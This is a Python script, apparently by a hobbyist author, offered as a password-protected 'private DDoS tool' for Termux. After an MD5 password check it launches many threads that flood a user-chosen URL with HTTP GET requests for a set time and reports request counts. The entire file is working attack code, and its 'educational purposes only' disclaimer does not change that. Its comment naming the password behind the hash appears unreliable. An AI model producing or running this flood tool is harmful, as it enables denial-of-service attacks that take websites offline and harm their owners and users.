#!/usr/bin/env python3
"""
🔥 DDOS TERMUX - PRIVATE TOOLS
=================================
Author: RpaezzXploit
GitHub: github.com/teguhganteng123
=================================
⚠️ For educational purposes only!
"""

import argparse
import sys
import requests
import threading
import time
import hashlib

# ============ PASSWORD PROTECTION ============
PASSWORD_HASH = "c9b70ffc77e8a8e3d4a3a2c7d5f5b5e5"  # Hash untuk "exploiter"

def check_password():
    """Cek password sebelum run tools"""
    print("\n" + "="*50)
    print("🔐 PRIVATE DDOS TOOLS - PASSWORD PROTECTED")
    print("="*50)
    
    attempts = 3
    for i in range(attempts):
        password = input("\n🗝️  Enter password to unlock tools: ")
        
        # Hash input password
        input_hash = hashlib.md5(password.encode()).hexdigest()
        
        if input_hash == PASSWORD_HASH:
            print("\n✅ Access Granted! Welcome back, hacker! 😈")
            print("🔥 Tools unlocked...")
            time.sleep(1)
            return True
        else:
            remaining = attempts - (i + 1)
            if remaining > 0:
                print(f"❌ Wrong password! {remaining} attempts remaining")
            else:
                print("💀 Maximum attempts reached. Tool locked!")
                sys.exit(0)
    
    return False

# CUSTOM BANNER
def show_banner():
    banner = """
╔═══════════════════════════════════════╗
║    🔥 DDOS PRIVATE TOOLS              ║
║    BY : RpaezzXploit                  ║
║    Version: 2.1 - PASSWORD PROTECTED  ║
╚═══════════════════════════════════════╝
===========================================
Usage: python3 ddos.py <target_url> <duration>
===========================================
"""
    print(banner)

# Argument parser
def parse_args():
    parser = argparse.ArgumentParser(
        description='DDOS Tools Private by RpaezzXploit',
        usage='python3 ddos.py <url> <duration> [options]',
        epilog='Example: python3 ddos.py http://example.com 60'
    )
    
    parser.add_argument(
        'url', 
        nargs='?', 
        help='Target URL (http://example.com)'
    )
    parser.add_argument(
        'duration', 
        nargs='?', 
        type=int, 
        help='Attack duration in seconds'
    )
    parser.add_argument(
        '-t', '--threads',
        type=int,
        default=100,
        help='Number of threads (default: 100)'
    )
    parser.add_argument(
        '--port',
        type=int,
        default=80,
        help='Target port (default: 80)'
    )
    
    return parser.parse_args()

# Attack function
attack_active = False
request_count = 0

def attack_thread(target_url, attack_duration):
    global attack_active, request_count
    
    end_time = time.time() + attack_duration
    
    while time.time() < end_time and attack_active:
        try:
            requests.get(target_url, timeout=3)
            request_count += 1
        except:
            pass
        time.sleep(0.01)

def main():
    global attack_active
    
    # ============ CHECK PASSWORD FIRST ============
    if not check_password():
        return
    
    # Show banner
    show_banner()
    
    # Parse arguments
    args = parse_args()
    
    # Jika tidak ada argumen, tampilkan usage
    if not args.url or not args.duration:
        print("❌ Error: Target URL and duration required!")
        print("\nUsage: python3 ddos.py <target_url> <duration>")
        print("Example: python3 ddos.py http://example.com 60")
        print("\nOptions:")
        print("  -t THREADS    Number of threads (default: 100)")
        print("  --port PORT   Target port (default: 80)")
        sys.exit(1)
    
    # Validate URL
    target_url = args.url
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Validate duration
    if args.duration <= 0:
        print("❌ Error: Duration must be greater than 0")
        sys.exit(1)
    
    print(f"\n🎯 Target: {target_url}")
    print(f"⏱️  Duration: {args.duration} seconds")
    print(f"⚡ Threads: {args.threads}")
    print(f"👤 Author: RpaezzXploit")
    print("\n[⚠️] Attack will AUTO-STOP after time ends")
    print("[⚠️] Restart script to attack again\n")
    
    # Countdown
    print("Starting attack in:")
    for i in range(3, 0, -1):
        print(f"[{i}]", end=" ", flush=True)
        time.sleep(1)
    print("GO!\n")
    
    # Start attack
    attack_active = True
    request_count = 0
    
    # Create threads
    threads = []
    for i in range(args.threads):
        t = threading.Thread(
            target=attack_thread, 
            args=(target_url, args.duration)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Timer progress
    start_time = time.time()
    try:
        while time.time() - start_time < args.duration:
            elapsed = int(time.time() - start_time)
            remaining = args.duration - elapsed
            minutes = elapsed // 60
            seconds = elapsed % 60
            
            print(f"\r[🟢] Attacking... {minutes:02d}:{seconds:02d} | Requests: {request_count} | Remaining: {remaining}s", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[🛑] Stopped by user")
    
    # Stop attack
    attack_active = False
    time.sleep(2)  # Wait for threads to finish
    
    elapsed_total = int(time.time() - start_time)
    print(f"\n\n{'='*50}")
    print(f"[✅] ATTACK FINISHED!")
    print(f"{'='*50}")
    print(f"📊 Statistics:")
    print(f"  • Target: {target_url}")
    print(f"  • Duration: {elapsed_total} seconds")
    print(f"  • Threads: {args.threads}")
    print(f"  • Total requests: {request_count}")
    print(f"  • Requests/sec: {request_count/elapsed_total:.1f}")
    print(f"  • Author: RpaezzXploit")
    print(f"{'='*50}")
    print("\n[🔒] Attack has STOPPED automatically")
    print("[🔁] Restart script to attack again")
    print("[⚠️] For educational use only!")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[❌] Error: {e}")
        sys.exit(1)
